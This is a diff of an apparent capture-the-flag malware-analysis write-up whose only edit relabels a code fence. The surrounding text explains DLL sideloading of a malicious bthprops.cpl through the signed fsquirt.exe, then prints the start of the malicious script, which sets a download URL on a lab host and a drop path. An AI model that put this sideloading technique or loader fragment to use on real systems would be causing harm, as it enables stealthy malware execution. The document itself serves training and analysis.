@@ -176,7 +176,7 @@ The logic here is very specific and indicates a **DLL Sideloading** attack.
 
 **Why?** Windows looks for DLLs in the *current directory* before the system directories. `fsquirt.exe` expects to load `bthprops.cpl` from functionality purposes. By placing a malicious `bthprops.cpl` next to it, the legitimate executable loads our malware. This is often done to bypass allow-listing (since `fsquirt.exe` is a signed Microsoft binary).
 
-```C
+```C++
 u = "http://gifts.bemyvalentine.thm/"
 p = t & "\valentine"
 s = o.ExpandEnvironmentStrings("%SYSTEMROOT%")
